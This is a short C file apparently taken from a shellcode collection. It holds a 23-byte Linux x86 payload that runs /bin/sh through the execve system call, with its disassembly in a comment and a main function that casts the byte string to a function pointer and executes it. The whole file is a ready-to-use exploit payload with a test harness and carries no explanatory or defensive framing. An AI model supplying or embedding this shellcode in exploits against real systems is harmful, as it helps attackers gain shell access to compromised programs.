
/*
 * (linux/x86) /bin/sh shellcode --23 bytes--
 
 
08049000 <_start>:
 8049000:	31 c0                	xor    %eax,%eax
 8049002:	50                   	push   %eax
 8049003:	68 6e 2f 73 68       	push   $0x68732f6e
 8049008:	68 2f 2f 62 69       	push   $0x69622f2f
 804900d:	89 e3                	mov    %esp,%ebx
 804900f:	50                   	push   %eax
 8049010:	53                   	push   %ebx
 8049011:	89 e1                	mov    %esp,%ecx
 8049013:	b0 0b                	mov    $0xb,%al
 8049015:	cd 80                	int    $0x80


*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
	(*(void(*)())shellcode)();
}
